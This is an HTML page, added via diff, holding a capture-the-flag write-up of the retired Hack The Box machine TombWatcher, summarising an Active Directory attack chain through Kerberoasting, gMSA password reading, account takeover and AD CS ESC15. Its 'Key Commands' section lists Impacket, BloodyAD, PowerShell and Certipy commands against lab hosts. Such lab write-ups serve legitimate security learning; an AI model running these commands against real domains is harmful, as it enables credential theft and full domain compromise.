@@ -1,0 +1,99 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>HTB TombWatcher | Daniel Galindo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="/src/styles/styles.css" />
+  </head>
+  <body data-page="writeups">
+    <div class="grid-overlay" aria-hidden="true"></div>
+    <div class="noise-overlay" aria-hidden="true"></div>
+
+    <header class="site-header">
+      <a class="site-logo" href="/en/index.html">met4ll0f</a>
+      <nav class="site-nav" aria-label="Main navigation">
+        <a data-nav="home" href="/en/index.html">Home</a>
+        <a data-nav="writeups" href="/en/writeups.html">Writeups</a>
+        <a data-nav="scripts" href="/en/scripts.html">Scripts</a>
+      </nav>
+    </header>
+
+    <section class="hero hero-compact">
+      <p class="hero-kicker">Hack The Box - Active Directory</p>
+      <h1>HTB TombWatcher</h1>
+      <p class="headline">Fake SPN Kerberoasting, gMSA password recovery, object takeover and AD CS ESC15</p>
+      <p class="meta">Retired - Root / Administrator</p>
+    </section>
+
+    <main class="writeup-article">
+      <section class="panel panel-large">
+<h2>Executive Summary</h2>
+<p>TombWatcher begins with a valid low-privileged domain account. That account can modify another user enough to add a fake SPN, enabling Kerberoasting and the recovery of stronger credentials.</p>
+<h2>Domain Progression</h2>
+<p>The cracked <code>alfred</code> credential can join the <code>Infrastructure</code> group. That group can read the managed password for the <code>ansible_dev$</code> gMSA, which provides the rights needed to reset another account and continue the chain.</p>
+<h2>Object Takeover</h2>
+<p>With <code>sam</code>, BloodyAD is used to take ownership of <code>john</code>, grant GenericAll and reset the password. The <code>john</code> account has remote management access, enabling an interactive WinRM session.</p>
+<h2>AD CS Escalation</h2>
+<p>BloodHound analysis points to control over the ADCS OU and a deleted <code>cert_admin</code> object. Restoring and enabling that account allows certificate abuse through ESC15, requesting a certificate on behalf of Administrator and authenticating as domain admin.</p>
+<h2>Key Commands</h2>
+<pre><code class="language-bash">GetUserSPNs.py tombwatcher.htb/henry:&lt;redacted-password&gt; -dc-ip 10.129.242.169 -request</code></pre>
+<pre><code class="language-bash">bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u sam -p &lt;redacted-password&gt; set owner john sam</code></pre>
+<pre><code class="language-bash">bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -u sam -p &lt;redacted-password&gt; add genericAll john sam</code></pre>
+<pre><code class="language-bash">Restore-ADObject -Identity &lt;deleted-object-guid&gt;</code></pre>
+<pre><code class="language-bash">Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword (ConvertTo-SecureString -AsPlainText &quot;&lt;redacted&gt;&quot; -Force)</code></pre>
+<pre><code class="language-bash">certipy req -u cert_admin@tombwatcher.htb -p &lt;redacted-password&gt; -on-behalf-of TOMBWATCHER\Administrator -template User -ca tombwatcher-CA-1 -pfx cert_admin.pfx -dc-ip 10.129.91.64</code></pre>
+<h2>Evidence Trail</h2>
+<p>The following screenshots preserve the original lab evidence sequence from the Obsidian notes.</p>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610075638.png" alt="tombwatcher evidence 01" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610080043.png" alt="tombwatcher evidence 02" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610083711.png" alt="tombwatcher evidence 03" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610083640.png" alt="tombwatcher evidence 04" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610110209.png" alt="tombwatcher evidence 05" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610110341.png" alt="tombwatcher evidence 06" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610082159.png" alt="tombwatcher evidence 07" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610082355.png" alt="tombwatcher evidence 08" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610082827.png" alt="tombwatcher evidence 09" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610213048.png" alt="tombwatcher evidence 10" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610213019.png" alt="tombwatcher evidence 11" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610213210.png" alt="tombwatcher evidence 12" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610213508.png" alt="tombwatcher evidence 13" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610213926.png" alt="tombwatcher evidence 14" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610214116.png" alt="tombwatcher evidence 15" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610214131.png" alt="tombwatcher evidence 16" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610214224.png" alt="tombwatcher evidence 17" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610232132.png" alt="tombwatcher evidence 18" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610233645.png" alt="tombwatcher evidence 19" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610234247.png" alt="tombwatcher evidence 20" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610234850.png" alt="tombwatcher evidence 21" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610234826.png" alt="tombwatcher evidence 22" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250611001729.png" alt="tombwatcher evidence 23" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250611002237.png" alt="tombwatcher evidence 24" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250611002641.png" alt="tombwatcher evidence 25" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250611002854.png" alt="tombwatcher evidence 26" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250611003340.png" alt="tombwatcher evidence 27" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250611003437.png" alt="tombwatcher evidence 28" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610230334.png" alt="tombwatcher evidence 29" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250611004549.png" alt="tombwatcher evidence 30" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250611004731.png" alt="tombwatcher evidence 31" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610230434.png" alt="tombwatcher evidence 32" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610230547.png" alt="tombwatcher evidence 33" /></figure>
+<figure class="writeup-figure"><img class="writeup-image" src="/src/images/writeups/tombwatcher/Pasted%20image%2020250610230806.png" alt="tombwatcher evidence 34" /></figure>
+      </section>
+    </main>
+
+    <footer class="footer">
+      <p>© <span class="js-year"></span> <span class="js-name"></span>.</p>
+      <a href="/en/writeups.html">Back to writeups</a>
+    </footer>
+
+    <script type="module" src="/src/js/site.js"></script>
+    <script type="module" src="/src/js/writeup-media.js"></script>
+  </body>
+</html>
